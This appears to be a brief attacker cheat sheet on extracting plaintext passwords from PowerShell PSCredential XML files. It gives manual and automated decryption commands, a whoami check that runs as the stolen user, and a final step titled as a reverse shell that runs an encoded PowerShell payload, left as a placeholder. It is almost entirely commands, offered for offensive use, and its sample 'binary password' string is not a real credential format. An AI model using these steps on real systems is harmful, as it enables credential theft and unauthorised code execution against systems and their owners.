# Decode the Xml password 
PSCredential XML Decryption is the process of extracting and converting securely stored credentials from serialized PowerShell objects in XML format back to plaintext authentication tokens.
```language
If the file contain the binary password, like this :- 0101919310841001837146106741741069169491893010101100101001010010010110100101016471551646101808181838
```
# You can Decrypt it using the Powershell Manuall and Automate Ways:-

# (1) Manuall Way
Make sure you paste the write Encoded password and username.
```language
$pwd = ConvertTo-SecureString  <encoded password>
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList "user_name",$pwd    # Grap the username from the xml file.
$cred.GetNetworkCredential().password
```
# (2) Manuall Way
```language
$secureString = ConvertTo-SecureString "<encrypted_binary>"
$credential = New-Object PSCredential("username", $secureString)
$plainTextPassword = $credential.GetNetworkCredential().Password
```
# Automate Way
```language
(Import-Clixml "C:\Path\To\Your\connection.xml").GetNetworkCredential().Password
```
# Verify it
```language
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } 2>&1
```
# Reverse shell as that user
```language
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { powershell -enc <encoded code here> } 2>&1
```
